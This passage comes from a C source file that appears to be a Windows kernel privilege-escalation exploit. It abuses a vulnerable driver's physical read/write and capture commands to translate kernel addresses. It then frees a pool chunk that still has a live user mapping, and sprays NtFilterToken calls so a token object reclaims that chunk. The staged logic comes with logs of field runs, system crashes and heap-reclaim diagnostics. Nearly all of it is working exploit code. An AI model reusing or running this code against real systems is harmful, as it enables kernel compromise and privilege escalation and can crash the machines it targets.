                    QsiFetch(pqsi);
                    uB = QsiTagUsed(t4);
                    if (stf == 0 && tF) {
                        CloseHandle(tF);
                        tF = NULL;
                    }
                    QsiFetch(pqsi);
                    uC = QsiTagUsed(t4);
                    if (uA == 0xFFFFFFFF || uB == 0xFFFFFFFF ||
                        uC == 0xFFFFFFFF) {
                        goto nextProc;
                    }
                    delta = (LONG64)((LONG)(uB - uA));
                    dCls  = (LONG64)((LONG)(uC - uB));
                    if (stf == 0 && delta > 0x40 && delta <= 0xFF0 &&
                        dCls == -delta && nMeas < 16) {
                        measured[nMeas++] = (UINT32)delta;
                        nOK++;
                        LogW(L"[i] [M5probe2] %ls (pid %lu): token body "
                             L"0x%03x via NtFilterToken(n=0), close-"
                             L"returns exactly", nm, (unsigned long)pid,
                             (unsigned long)delta);
                    }
                nextProc:
                    if (tS)
                        CloseHandle(tS);
                    if (hP)
                        CloseHandle(hP);
                    {
                        ULONG nxt = *(ULONG *)p;

                        if (!nxt)
                            break;
                        if (nxt < 0x64 || p - pbuf + nxt > (ULONG)sz)
                            break;      /* raced/truncated entry: stop */
                        p += nxt;
                    }
                }
            }
            ProofLog(L"[i] [M5probe2] body-size walk: %lu openable, "
                     L"%lu refused", nOK, nDen);
            if (nMeas) {
                UINT32 k;

                LogW(L"[i] [M5probe2] %lu candidate bodies in "
                     L"[0x40,0xff0] (close-verified):", nMeas);
                for (k = 0; k < nMeas; k++)
                    LogW(L"[i] [M5probe2]   body 0x%03x",
                         (unsigned long)measured[k]);
            } else {
                ProofLog(L"[i] [M5probe2] no accessible process produced a "
                         L"body-size delta in [0x40,0xff0] close-verified -- "
                         L"token bodies may be lookaside-segregated (v4.5 "
                         L"pivot data regardless)");
            }
        }
    }
    /* translation route (field-proven in E1.5/--leak): CR3 via 0xFFF02860
     * sel=3 + phys reads turns any KVA into its exact PA with a 4-level
     * page-table walk. The capture reply NAMES the ADIO block KVA, so M1
     * and M2 become ~8 transport calls with ZERO scanning -- the 6 GB
     * pattern scans (v4.0.x: ~30 min per sweep, one sweep per fresh boot)
     * are demoted to fallback. */
    if (DevCmdCrRead(3, &cr3) && (cr3 & 0x000FFFFFFFFFF000ULL))
        cr3 &= 0x000FFFFFFFFFF000ULL;   /* DTB; raw CR3 carries PCID in
         * bits 0..11 (+ NOFLUSH bit 63) on modern Windows -- an exact-4K
         * sanity would reject a VALID PCID-tagged CR3 (v4.1 fallback;
         * sel=3 returns raw __readcr3(), sub_140001060 case 3, no mask) */
    if (cr3 && cr3 < 0x10000000000ULL)
        LogW(L"[i] CR3 (DTB, PCID-masked) = 0x%016llx -- M1/M2 use the "
             L"walk route (zero scans)", (unsigned long long)cr3);
    else {
        LogW(L"[!] CR3 read/sanity failed -- M1/M2 fall back to seed "
             L"scans (slow path)");
        cr3 = 0;
    }
    ZeroMemory(zsub, sizeof(zsub));
    ZeroMemory(&anchor, sizeof(anchor));
    /* v4.3.0: preflight first -- the region census decides walk-vs-scan
     * BEFORE anything spends time in a region that refuses maps (the
     * 23:19 run attempted the walk against a dead band and then ground
     * 2668 refused scan windows because nothing knew which regions
     * refuse). The preflight also owns the anchor alloc and the TESTED
     * capture-source selection (paint + capture + content per anchor
     * page; 00:10 field: a guessed source PA burns the ladder). */
    if (!MapPreflight(&anchor, TRUE)) {
        ProofLog(L"[x] preflight class %u: this boot cannot serve the "
                 L"chain's map family -- restore S2, reboot, rerun",
                 g_prof.cls);
        if (anchor.kva)
            DevCmdContigFree(&anchor);
        return 3;
    }
    cr3        = g_prof.cr3;
    anchorPa   = anchor.physPa;
    anchorCap  = g_prof.capSrc;
    if (anchorPa != g_prof.anchorPa)
        LogW(L"[x] anchor PA mismatch after preflight (should not happen)");
    if (!anchorCap) {
        /* 00:10 field: no verified capture source -> every M1 capture
         * transport-failed GLE=8 at every len before any scan could
         * even start (rc=3 in 1.6 s, decisive -- but late). Decide here,
         * before the ladder burns. */
        ProofLog(L"[x] preflight: no capture source PA passed the "
                 L"paint+capture test -- the M1 victim capture cannot "
                 L"run; restore S2, reboot, rerun");
        DevCmdContigFree(&anchor);
        return 3;
    }

    for (c = 0; c < cycles && !gotSys; c++) {
        for (Li = 0; Li < kLLadder && !gotSys; Li++) {
            UINT32 L;
            if (probeOK && Li == 0)
                L = probeS;   /* v4.1.5: fire at the MEASURED token size */
            else {
                L = kL0 - Li * kLStep;
                if (probeOK && L == probeS)
                    L -= kLStep;  /* skip the duplicate of probe len */
            }
            S2FOUND fnd;
            UINT8   baseline[16];
            BYTE    preFire[0x50];      /* v4.4.5 [HDRDUMP]: pre-fire copy */
            SIZE_T  brh = 0;
            BOOL    preFireOK = FALSE;
            HANDLE  hTok = NULL;
            UINT32  fireSt = 0;
            BOOL    doneTok = FALSE;

            ZeroMemory(&cap, sizeof(cap));
            ZeroMemory(&fnd, sizeof(fnd));
            LogW(L"");
            LogW(L"[M1] cycle %u: victim capture len=0x%03x (bucket 0x%x)",
                 c, L, L + 0x10);
            if (!DevCmdCapture(anchorCap, L, &cap) || !cap.userVa ||
                !cap.block) {
                LogW(L"[x] capture(len=0x%03x) failed -- next len", L);
                continue;
            }
            {
                UINT64 blkPa = 0, pa64 = 0;
                UINT8  blk[0x20];
                BOOL   walkOK = FALSE;

                ZeroMemory(blk, sizeof(blk));
                /* PRIMARY (walk): the reply names the 0x20 ADIO block KVA;
                 * translate, read the metadata the driver itself wrote,
                 * verify len byte + userVa against the reply, and take
                 * dataKVA (+0x18) and the dbuf user-map MDL (+0x10) from
                 * it. dataPA = walk(dataKVA). Gated on the preflight: the
                 * PML4 page must live in a census-served region. */
                if (!g_prof.useWalk && c == 0 && Li == 0)
                    LogW(L"[i] [M1] walk route disarmed by preflight "
                         L"(PML4 PA 0x%012llx in a refused region) -- "
                         L"straight to the census scan",
                         (unsigned long long)g_prof.cr3);
                if (g_prof.useWalk && cr3 && KvaToPa(cr3, cap.block, &blkPa) &&
                    ReadPhysBytes(blkPa, blk, 0x20) &&
                    blk[0] == (UINT8)L &&
                    *(UINT64 *)(blk + 8) == cap.userVa) {
                    fnd.dataKVA = *(UINT64 *)(blk + 0x18);
                    fnd.mdlKva  = *(UINT64 *)(blk + 0x10);
                    if (fnd.dataKVA && KvaToPa(cr3, fnd.dataKVA, &pa64)) {
                        UINT8 tmp[0x40], usr[0x40];
                        SIZE_T br = 0;

                        fnd.dataPA = pa64;
                        /* E2E against ground truth: the data buffer must
                         * read the same through phys and through the
                         * capture's own user window */
                        if (DevCmdPhysRead(fnd.dataPA, tmp, 0x40) &&
                            ReadProcessMemory(GetCurrentProcess(),
                                (LPCVOID)(ULONG_PTR)cap.userVa, usr, 0x40,
                                &br) && br == 0x40 &&
                            memcmp(tmp, usr, 0x40) == 0) {
                            walkOK = TRUE;
                            LogW(L"    [M1] walk route: block PA=0x%012llx "
                                 L"-> dataKVA=0x%016llx dataPA=0x%012llx "
                                 L"mdl=0x%016llx, E2E phys-vs-window MATCH "
                                 L"(zero scan calls)",
                                 (unsigned long long)blkPa,
                                 (unsigned long long)fnd.dataKVA,
                                 (unsigned long long)fnd.dataPA,
                                 (unsigned long long)fnd.mdlKva);
                        } else {
                            LogW(L"    [M1] walk route: dataPA mismatch vs "
                                 L"user window -- scan fallback");
                        }
                    }
                }
                if (!walkOK) {
                    UINT64 pattern = cap.userVa;
                    BOOL   warmFound = FALSE;

                    for (i = 0; i < 2 && !warmFound; i++) {
                        /* two passes: the list can re-seed with a fresh
                         * strong hit while scanning */
                        warmFound = S2SeedScan(pattern, &cap, L, &fnd,
                                               FALSE, L"[M1]");
                    }
                    if (!warmFound) {
                        LogW(L"[i] [M1] seed spans missed -- census-ordered "
                             L"OK-band sweep (preflight-decided regions, "
                             L"pool band first)");
                        warmFound = CensusSweep(pattern, &cap, L, &fnd,
                                                FALSE, L"[M1]");
                    }
                    if (!warmFound) {
                        LogW(L"[x] cycle %u len=0x%03x: leak M1 failed -- "
                             L"next len", c, L);
                        continue;
                    }
                }
            }
            leaked++;
            ProofLog(L"[+] --s2token cycle %u M1 (leak): len=0x%03x "
                     L"block=0x%016llx userVa=0x%016llx dataKVA=0x%016llx "
                     L"dataPA=0x%012llx (mdl=%ls)", c, L,
                     (unsigned long long)cap.block,
                     (unsigned long long)cap.userVa,
                     (unsigned long long)fnd.dataKVA,
                     (unsigned long long)fnd.dataPA,
                     fnd.mdlKva ? L"seen" : L"not needed");

            /* M2: the donor pair. RUN-9 FIELD FIX (0x4E 0x9A PFN_LIST_
             * CORRUPT, PFN 0x11ffc5 = a donor contig page): a CONTIG donor
             * is PFN-POISON for the A8 worker -- the contig alloc locks its
             * pages with MmProbeAndLockPages(IoModifyAccess) and the legit
             * free drops that with MmUnlockPages, but the A8 worker
             * (sub_140002CB8) does ONLY MmUnmapLockedPages + IoFreeMdl --
             * never MmUnlockPages -- so every donor page keeps a dangling
             * PFN reference and the memory manager bugchecks 0x4E later.
             * Capture pairs are safe donors instead: capture MDLs are built
             * IoAllocateMdl + MmBuildMdlForNonPagedPool + user map with NO
             * MmProbeAndLockPages, so unmap + IoFreeMdl is balanced (the
             * E1.x runs did exactly that on real capture blocks, hundreds
             * of times, benignly). Donor = a second capture's reply userVa
             * + its user-map MDL (= capture block +0x10) from a warm
             * block-shape scan, pair-verified by physread(MDL+0x10) ==
             * userVa (MappedSystemVa). */
            {
                DEVREQ  capD;
                S2FOUND fndD;
                UINT8   back[0x10];
                UINT64  mdlPa = 0;
                SIZE_T  br = 0;
                SIZE_T  bw = 0;
                BOOL    ok2, foundD = FALSE, verOK;

                ZeroMemory(&capD, sizeof(capD));
                ZeroMemory(&fndD, sizeof(fndD));
                if (!DevCmdCapture(anchorCap, 0x40, &capD) || !capD.userVa) {
                    LogW(L"[x] donor capture failed -- next len");
                    continue;
                }
                {
                    /* PRIMARY (walk): donor block KVA straight from the
                     * reply -- translate, read, verify, take the user-map
                     * MDL from +0x10. Zero scans. Preflight-gated like M1. */
                    UINT64 paDb = 0;
                    UINT8  blkD[0x20];

                    if (g_prof.useWalk && cr3 && KvaToPa(cr3, capD.block, &paDb) &&
                        ReadPhysBytes(paDb, blkD, 0x20) &&
                        blkD[0] == 0x40 &&
                        *(UINT64 *)(blkD + 8) == capD.userVa) {
                        donorUserVa = capD.userVa;
                        donorMdl    = *(UINT64 *)(blkD + 0x10);
                        foundD = TRUE;
                        /* the MDL KVA needs its own PA for the pair
                         * verify -- run-11 field bug: physread(MDL KVA
                         * +0x10) treats kernel bits as a PHYSICAL
                         * address, so the verify was garbage for BOTH
                         * routes */
                        KvaToPa(cr3, donorMdl, &mdlPa);
                        LogW(L"    [M2] donor walk route: block PA=0x%012llx"
                             L" mdl=0x%016llx (zero scan calls)",
                             (unsigned long long)paDb,
                             (unsigned long long)donorMdl);
                    }
                }
                if (!foundD) {
                    /* fallback: seeded block-shape scans, then the full
                     * sweep */
                    for (i = 0; i < 2 && !foundD; i++)
                        foundD = S2SeedScan(capD.userVa, &capD, 0x40, &fndD,
                                            TRUE, L"[M2]");
                    if (!foundD) {
                        LogW(L"[i] [M2] seed spans missed -- census-ordered "
                             L"OK-band sweep (pool band first)");
                        foundD = CensusSweep(capD.userVa, &capD, 0x40,
                                             &fndD, TRUE, L"[M2]");
                    }
                    if (foundD) {
                        donorUserVa = capD.userVa;
                        donorMdl    = fndD.mdlKva;
                    }
                }
                if (!foundD || !donorMdl) {
                    LogW(L"[x] donor block not found (MDL address needed "
                         L"for the donor pair) -- next len");
                    continue;
                }
                /* pair integrity: the MDL's MappedSystemVa (+0x10) must
                 * be the donor userVa. Verify through the MDL's PA when
                 * the walk gave one; on the scan route the PA is unknown
                 * (PML4 pages are unmappable on hardened boots) and the
                 * pair evidence is the driver-written block itself --
                 * blk[0]=0x40, +0x08 == userVa, +0x10 == the driver's own
                 * MDL pointer -- trusted at exactly the level run-8's
                 * dataKVA leak trusted the same fields. */
                if (mdlPa) {
                    verOK = ReadPhysBytes(mdlPa + 0x10, back, 8) &&
                            *(UINT64 *)back == donorUserVa;
                } else {
                    verOK = foundD && !!donorMdl;
                    LogW(L"[i] [M2] pair verified by driver-written block "
                         L"shape (no PA route to the MDL on this boot)");
                }
                LogW(L"[M2] donor (capture pair): userVa=0x%016llx "
                     L"mdl=0x%016llx %ls",
                     (unsigned long long)donorUserVa,
                     (unsigned long long)donorMdl,
                     verOK ? L"-- PAIR VERIFIED -- M3 arms"
                           : L"-- VERIFY MISMATCH -- next len");
                if (!verOK)
                    continue;
                {
                    UINT8 *base = (UINT8 *)(uintptr_t)cap.userVa;

                    *(volatile UINT64 *)(base + 0x08) = donorUserVa;
                    *(volatile UINT64 *)(base + 0x10) = donorMdl;
                    ok2 = ReadProcessMemory(GetCurrentProcess(),
                            (LPCVOID)(ULONG_PTR)(cap.userVa + 8),
                            back, 0x10, &br) && br == 0x10 &&
                          *(volatile UINT64 *)(back + 0) == donorUserVa &&
                          *(volatile UINT64 *)(back + 8) == donorMdl;
                    if (!ok2) {
                        /* fallback 1: WriteProcessMemory (address-based --
                         * no VAD walk needed for window writes) */
                        ok2 = WriteProcessMemory(GetCurrentProcess(),
                                (LPVOID)(ULONG_PTR)(cap.userVa + 8),
                                &donorUserVa, 8, &bw) &&
                              WriteProcessMemory(GetCurrentProcess(),
                                (LPVOID)(ULONG_PTR)(cap.userVa + 0x10),
                                &donorMdl, 8, &bw);
                        if (ok2)
                            LogW(L"[M2] direct deref write refused -- WPM "
                                 L"served the paint");
                    }
                    if (!ok2 && fnd.dataPA) {
                        /* fallback 2: physwrite at dataPA (buffer PA from
                         * the MDL PFN route) */
                        ok2 = DevCmdPhysWrite(fnd.dataPA + 0x08,
                                              &donorUserVa, 8) &&
                              DevCmdPhysWrite(fnd.dataPA + 0x10, &donorMdl,
                                              8);
                        if (ok2)
                            LogW(L"[M2] WPM refused -- 0xFFF02820 "
                                 L"physwrite at dataPA served the paint");
                    }
                    if (!ok2) {
                        LogW(L"[x] M2 donor paint failed on every path -- "
                             L"next len (donor capture block left live, "
                             L"as in every benign run)");
                        continue;
                    }
                }
            }
            ProofLog(L"[+] --s2token cycle %u M2 (donor paint): capture "
                     L"pair (userVa=0x%016llx, mdl=0x%016llx) verified at "
                     L"buffer+0x08/+0x10", c,
                     (unsigned long long)donorUserVa,
                     (unsigned long long)donorMdl);

            /* v4.4.2 [HDRDUMP]: header context BEFORE the fire -- the
             * baseline the post-fire dump is diffed against */
            HdrDump(L"HDRDUMP", cap.userVa, TRUE);
            preFireOK = ReadProcessMemory(GetCurrentProcess(),
                          (LPCVOID)(ULONG_PTR)(cap.userVa - 0x10), preFire,
                          0x50, &brh) && brh == 0x50;

            /* M3: the fire. B = dataKVA: worker derefs OUR capture pair
             * (balanced legs: unmap + IoFreeMdl, nothing left to unlock)
             * and frees the data buffer chunk with the single, tag-0 free
             * a legit unmap performs */
            if (!DevCmdUnmap(fnd.dataKVA, &fireSt) || fireSt != 0) {
                LogW(L"[x] M3 A8 fire failed (transport/st=%u) -- next len",
                     fireSt);
                continue;
            }
            fired++;
            ProofLog(L"[+] --s2token cycle %u M3 (A8 fire): status %u -- "
                     L"donor capture pair torn down (no PFN refs left), "
                     L"chunk 0x%016llx (len 0x%03x) FREED through the "
                     L"unmap path", c, fireSt,
                     (unsigned long long)fnd.dataKVA, L);
            /* the donor capture block stays live (its MDL was freed by the
             * worker) -- same intentional leak every benign run carries */

            /* M4: stale-window sanity -- the capture's user mapping was
             * never unmapped, so the freed chunk is still RW here */
            {
                UINT8  post[16];
                SIZE_T br = 0;

                if (!ReadProcessMemory(GetCurrentProcess(),
                                       (LPCVOID)(ULONG_PTR)cap.userVa, post,
                                       0x10, &br) || br != 0x10) {
                    LogW(L"[x] M4 stale window unreadable post-fire -- next "
                         L"len (this should not happen)");
                    continue;
                }
                memcpy(baseline, post, 0x10);
                ProofLog(L"[+] --s2token cycle %u M4 (stale window): "
                         L"post-fire window readable (no VAD, PTEs real); "
                         L"first qword=0x%016llx", c,
                         (unsigned long long)*(UINT64 *)baseline);
                /* v4.4.5 [HDRDUMP]: post-fire dump + diff against pre-fire.
                 * Geometry rewritten: buffers are read FORWARD from the
                 * capture userVa -- [userVa-0x10, +0x40) is always inside
                 * the stale one-page user map (the v4.4.4 read of
                 * userVa-0x60 +0x90 fell outside it when the body landed
                 * at page offset 0x10 -- exactly what killed both dumps on
                 * the 02:23 boot).
                 * Answers: did the free rewrite the header tag (freed) or
                 * nothing at all (never touched)? did the body gain
                 * Flink/Blink (classic free-list insert)? */
                {
                    BYTE p2[0x50];

                    HdrDump(L"HDRDUMP", cap.userVa, FALSE);
                    if (preFireOK &&
                        ReadProcessMemory(GetCurrentProcess(),
                          (LPCVOID)(ULONG_PTR)(cap.userVa - 0x10), p2, 0x50,
                          &brh) && brh == 0x50) {
                        /* v4.4.5 offsets (buffer starts @-0x10):
                         * header dword0 @0 (= userVa-0x10),
                         * tag 'ADIO' @4 (= userVa-0x0C),
                         * body starts @0x10 (= userVa) */
                        if (memcmp(preFire + 4, p2 + 4, 4)) {
                            if (p2[4] == 0 && p2[5] == 0 &&
                                p2[6] == 0 && p2[7] == 0)
                                LogW(L"[HDRDUMP] dbuf hdr tag 'ADIO' "
                                     L"@-0x0C ZEROED by the fire");
                            else
                                LogW(L"[HDRDUMP] DIFF: dbuf hdr tag slot "
                                     L"@-0x0C CHANGED %02x%02x%02x%02x -> "
                                     L"%02x%02x%02x%02x",
                                     preFire[4], preFire[5],
                                     preFire[6], preFire[7],
                                     p2[4], p2[5], p2[6], p2[7]);
                        } else
                            LogW(L"[HDRDUMP] dbuf hdr tag @-0x0C "
                                 L"UNCHANGED by the fire (header intact -- "
                                 L"the 02:23-boot case, now interpretable "
                                 L"with this baseline)");
                        if (memcmp(preFire + 0, p2 + 0, 0x10))
                            LogW(L"[HDRDUMP] the WHOLE 0x10 POOL_HEADER "
                                 L"changed by the fire (01:52/02:04 boots: "
                                 L"zeroed entirely; body untouched)");
                        if (memcmp(preFire + 0x10, p2 + 0x10, 0x10))
                            LogW(L"[HDRDUMP] DIFF: body [0..+0x10) changed "
                                 L"by the fire (free-list links?) pre="
                                 L"%016llx post=%016llx",
                                 (unsigned long long)*(UINT64 *)
                                 (preFire + 0x10),
                                 (unsigned long long)*(UINT64 *)(p2 + 0x10));
                        else
                            LogW(L"[HDRDUMP] body [0..+0x10) unchanged by "
                                 L"the fire -- NO free-list links written");
                    } else if (!preFireOK) {
                        LogW(L"[HDRDUMP] pre-fire dump was unreadable -- "
                             L"diff unavailable (post-fire dump above)");
                    }
                }
            }

            /* M5: the lure. NtFilterToken ladder; the token whose pool
             * bucket equals len+0x10 reclaims the fired-off chunk */
            {
                UINT32 foreignStreak = 0;
                DWORD  tokeTag = probeTag;   /* v4.1.9: runtime -- the
                                               * probe's discovered tag */
                BOOL   hdrOK;
                BYTE   hdr[16];
                SIZE_T hbr = 0;

                hdrOK = ReadProcessMemory(GetCurrentProcess(),
                        (LPCVOID)(ULONG_PTR)(cap.userVa - 0x10), hdr, 0x10,
                        &hbr) && hbr == 0x10;
                ProofLog(L"[i] cycle %u M5 (lure): starting NtFilterToken "
                         L"ladder n=0..%u for len=0x%03x", c, kMaxN, L);
                /* v4.4.3 tag-offset fix (HDRDUMP 01:52 decode): x64
                 * POOL_HEADER tag is at header+4 = hdr[4..8]; hdr[8..16]
                 * is the process-billed pointer -- the E9 AF 0E 5E the
                 * field ever reported was THAT, never a tag. */
                LogW(L"[M5] lure: chunk hdr %ls, hdr tag %C%C%C%C; ladder "
                     L"n=0..%u",
                     hdrOK ? L"mapped" : L"not readable (page-aligned body)",
                     hdrOK ? hdr[4] : L'?', hdrOK ? hdr[5] : L'?',
                     hdrOK ? hdr[6] : L'?', hdrOK ? hdr[7] : L'?', kMaxN);
                for (n = 0; n <= kMaxN && !doneTok; n++) {
                    NTSTATUS ns;
                    UINT8    win[16];
                    SIZE_T   wbr = 0;
                    DWORD    tag = 0;
                    BOOL     winCh;

                    *(ULONG *)grpMem = n;
                    for (i = 0; i < n; i++) {
                        S2FSID *s = (S2FSID *)(sidMem + i * 12);
                        SID_AND_ATTRIBUTES *sa =
                            (SID_AND_ATTRIBUTES *)(grpMem + 8 + i * 16);

                        s->rev = 1;
                        s->cnt = 1;
                        memset(s->ia, 0, 6);        /* S-1-0-x */
                        s->sub = (DWORD)(i + 1);
                        sa->Sid = (PSID)(uintptr_t)s;
                        sa->Attributes = 0;
                    }
                    if (n == 0 && Li == 0 && c == 0)
                        LogW(L"[i] NtFilterToken allocs tokens grown by "
                             L"n*delta -- only the n whose bucket matches "
                             L"len+0x10 can land; misses are closed and "
                             L"re-laddered");
                    ns = pFilterToken(hSelf, 0, NULL,
                                      (PTOKEN_GROUPS)grpMem, NULL, &hTok);
                    if (ns || !hTok) {
                        if (n == 0)
                            LogW(L"[x] NtFilterToken n=%u failed "
                                 L"NTSTATUS=0x%08lx -- lure broken", n,
                                 (unsigned long)ns);
                        hTok = NULL;
                        continue;
                    }
                    winCh = ReadProcessMemory(GetCurrentProcess(),
                            (LPCVOID)(ULONG_PTR)cap.userVa, win, 0x10,
                            &wbr) && wbr == 0x10 &&
                            memcmp(win, baseline, 0x10) != 0;
                    tag = hdrOK
                        ? *(DWORD *)(hdr + 8)   /* stale; refresh below */
                        : 0;
                    if (hdrOK) {
                        UINT8 hdr2[16];
                        SIZE_T hbr2 = 0;

                        if (ReadProcessMemory(GetCurrentProcess(),
                                (LPCVOID)(ULONG_PTR)(cap.userVa - 0x10),
                                hdr2, 0x10, &hbr2) && hbr2 == 0x10)
                            tag = *(DWORD *)(hdr2 + 8);
                    }
                    if (tag == tokeTag || (!hdrOK && winCh)) {
                        recli++;
                        doneTok = TRUE;
                        if (tag == tokeTag)
                            LogW(L"[M5] HIT at n=%u: PoolTag='Toke' at "
                                 L"window-0x10 -- a token reclaims the fired "
                                 L"chunk (window[0]=0x%016llx)", n,
                                 (unsigned long long)*(UINT64 *)win);
                        else
                            LogW(L"[M5] AMBIGUOUS HIT at n=%u: hdr not "
                                 L"readable (page-aligned body), window "
                                 L"changed -- relying on the M6 handle "
                                 L"verify to arbitrate "
                                 L"(window[0]=0x%016llx)", n,
                                 (unsigned long long)*(UINT64 *)win);
                        ProofLog(L"[+] --s2token cycle %u M5 (reclaim): "
                                 L"len=0x%03x bucket=0x%x claimed by the "
                                 L"NtFilterToken n=%u token", c, L, L + 0x10,
                                 n);
                        break;
                    }
                    if (winCh) {
                        /* occupied but not by a token (a transient SE
                         * capture chunk or similar) -- our token went
                         * elsewhere and this chunk's bucket is now taken */
                        foreignStreak++;
                        LogW(L"[M5] n=%u: occupied, no 'Toke' tag "
                             L"(foreign chunk) -- re-laddering", n);
                        CloseHandle(hTok);
                        hTok = NULL;
                        if (foreignStreak >= 2) {
                            LogW(L"[x] M5: chunk occupied by foreign "
                                 L"allocations -- next len");
                            break;
                        }
                        continue;
                    }
                    CloseHandle(hTok);
                    hTok = NULL;
                }  /* n ladder */
            }  /* M5 */
            if (!doneTok) {
                /* v4.1.4: run-13 field data -- 87 s after the first-ever
                 * M3 fire (status 0, M4 window live), the continued sweep
                 * for the NEXT len bugchecked 0x4E PFN_LIST_CORRUPT
                 * (P1=0x9A, P2=PFN 0x451D2), the same signature as run-9.
                 * Post-fire activity is crash-prone; the first fire that
                 * fails to reclaim gets no second chance this run.
                 * v4.4.0: before stopping, ONE decisive diagnostic (the
                 * 01:25 clean negative demands it): M4b -- can the GENERIC
                 * pool path reclaim the chunk? Paint the verified capture
                 * source with distinct bytes, capture the same bucket from
                 * this same pinned thread, read the stale window.
                 *   window == marker2 -> the free list serves the chunk;
                 *     the token lure's bucket/allocator path is the suspect
                 *   window unchanged -> the A8-freed chunk is NOT served by
                 *     the pool free list; the free leg itself is the suspect
                 *   window foreign bytes -> a background alloc took the
                 *     chunk between the fire and this capture. */
                {
                    static const UINT64 mk2[4] = {
                        0x1337C0DE55550001ULL, 0x1337C0DE55550002ULL,
                        0x1337C0DE55550003ULL, 0x1337C0DE55550004ULL };
                    DEVREQ cp2;
                    UINT8  post[0x20], hdr3[0x10];
                    SIZE_T pbr = 0, hbr3 = 0;
                    BOOL   got;

                    ZeroMemory(&cp2, sizeof(cp2));
                    if (DevCmdPhysWrite(g_prof.capSrc, mk2, 0x20) &&
                        DevCmdCapture(g_prof.capSrc, L, &cp2)) {
                        /* v4.4.2: NAME the fresh allocs -- where did the
                         * allocator actually serve this same-bucket pair? */
                        LogW(L"[M4b] fresh capture reply: block=0x%016llx "
                             L"userVa=0x%016llx (fired chunk was "
                             L"0x%016llx)", (unsigned long long)cp2.block,
                             (unsigned long long)cp2.userVa,
                             (unsigned long long)fnd.dataKVA);
                        LogW(L"[M4b] same-bucket capture issued post-fire "
                             L"(len=0x%03x, source repaint = marker2)", L);
                        got = ReadProcessMemory(GetCurrentProcess(),
                                (LPCVOID)(ULONG_PTR)cap.userVa, post, 0x20,
                                &pbr) && pbr == 0x20;
                        if (got) {
                            if (!memcmp(post, mk2, 0x20))
                                ProofLog(L"[+] --s2token cycle %u M4b "
                                         L"(generic reclaim): the fresh "
                                         L"capture RECLAIMED the fired "
                                         L"chunk (window = marker2) -- "
                                         L"the pool free list serves it; "
                                         L"the TOKEN lure's bucket/"
                                         L"allocator path is the suspect",
                                         c);
                            else if (!memcmp(post, baseline, 0x10))
                                ProofLog(L"[x] --s2token cycle %u M4b: "
                                         L"window unchanged after a fresh "
                                         L"same-bucket capture -- the "
                                         L"A8-freed chunk is NOT served "
                                         L"by the pool free list; the "
                                         L"free leg itself is the suspect",
                                         c);
                            else
                                ProofLog(L"[!] --s2token cycle %u M4b: "
                                         L"window holds foreign bytes "
                                         L"(0x%016llx...) -- a background "
                                         L"allocation took the chunk "
                                         L"between the fire and this "
                                         L"capture", c,
                                         (unsigned long long)
                                         *(UINT64 *)post);
                        } else {
                            ProofLog(L"[x] --s2token cycle %u M4b: window "
                                     L"unreadable post-capture "
                                     L"(stale PTE invalidated?)", c);
                        }
                        if (ReadProcessMemory(GetCurrentProcess(),
                                (LPCVOID)(ULONG_PTR)(cap.userVa - 0x10),
                                hdr3, 0x10, &hbr3) && hbr3 == 0x10)
                            LogW(L"[M4b] chunk hdr tag now %C%C%C%C "
                                 L"(post capture)",        /* tag @+4 */
                                 hdr3[4], hdr3[5], hdr3[6], hdr3[7]);
                        else
                            LogW(L"[M4b] chunk hdr no longer readable "
                                 L"post capture");
                        /* v4.4.3 [M4c] burst: the field HDRDUMP says the
                         * tag-0 free ZEROED the 0x10 POOL_HEADER (tag
                         * 'ADIO' was at -0x0C, header+4) while the body
                         * kept our bytes -- no Flink/Blink ever written.
                         * One same-bucket alloc did not serve the chunk.
                         * Before calling the free leg a black hole, K more
                         * immediate same-bucket captures get their chance;
                         * the window turns marker2 if any lands in it. */
                        {
                            DEVREQ cp3;
                            UINT32 r, reclaimed = 0;
                            UINT8  post2[0x20];
                            SIZE_T pbr2 = 0;

                            LogW(L"[M4c] burst: up to 8 more same-bucket "
                                 L"(len=0x%03x) captures, window "
                                 L"re-checked each round", L);
                            for (r = 0; r < 8 && !reclaimed; r++) {
                                ZeroMemory(&cp3, sizeof(cp3));
                                if (!DevCmdCapture(g_prof.capSrc, L, &cp3)) {
                                    LogW(L"[M4c] round %u capture failed "
                                         L"GLE=%lu", r, GetLastError());
                                    continue;
                                }
                                LogW(L"[M4c] round %u reply: block=0x%016"
                                     L"llx userVa=0x%016llx", r,
                                     (unsigned long long)cp3.block,
                                     (unsigned long long)cp3.userVa);
                                if (ReadProcessMemory(GetCurrentProcess(),
                                        (LPCVOID)(ULONG_PTR)cap.userVa,
                                        post2, 0x20, &pbr2) &&
                                    pbr2 == 0x20 &&
                                    !memcmp(post2, mk2, 0x20)) {
                                    reclaimed = 1;
                                    ProofLog(L"[+] --s2token cycle %u M4c: "
                                             L"round %u RECLAIMED the fired "
                                             L"chunk (window = marker2) -- "
                                             L"the chunk IS served by pool "
                                             L"allocs; M4b was a one-shot "
                                             L"miss", c, r);
                                }
                            }
                            if (!reclaimed)
                                ProofLog(L"[x] --s2token cycle %u M4c: 9 "
                                         L"immediate same-bucket allocs "
                                         L"(M4b + burst) never served the "
                                         L"fired chunk -- stranded not-"
                                         L"listed (delayed-free/quarantine "
                                         L"suspect) OR the pool entry was "
                                         L"never returned to any list "
                                         L"(header wiped, not retired)",
                                         c);
                            /* v4.4.4 [M4d] larger-size serve probe (the
                             * absorb/coalesce model): if the freed space
                             * was merged into a bigger free extent, a
                             * LARGER same-thread capture can land its
                             * dbuf inside the window's page. Paint 6
                             * marker2 qwords at capSrc (body-start shifts
                             * up to +0x30 of the copy still carry the
                             * prefix), then scan the window qwords for
                             * q>>16 == 0x1337C0DE5555. */
                            {
                                static const UINT64 mk6[6] = {
                                    0x1337C0DE55550001ULL,
                                    0x1337C0DE55550002ULL,
                                    0x1337C0DE55550003ULL,
                                    0x1337C0DE55550004ULL,
                                    0x1337C0DE55550005ULL,
                                    0x1337C0DE55550006ULL };
                                static const UINT32 m4dLens[4] =
                                    { 0x780, 0x800, 0xE00, 0x1400 };
                                DEVREQ cp4;
                                UINT32 r4, found = 0;
                                UINT8  w2[0x710];
                                SIZE_T wbr2 = 0;

                                if (!DevCmdPhysWrite(g_prof.capSrc, mk6,
                                                     0x30))
                                    LogW(L"[M4d] source repaint failed "
                                         L"(probe degraded but continuing)");
                                for (r4 = 0; r4 < 4 && !found; r4++) {
                                    UINT32 q;

                                    ZeroMemory(&cp4, sizeof(cp4));
                                    if (!DevCmdCapture(g_prof.capSrc,
                                            m4dLens[r4], &cp4)) {
                                        LogW(L"[M4d] capture len=0x%03x "
                                             L"failed GLE=%lu",
                                             m4dLens[r4], GetLastError());
                                        continue;
                                    }
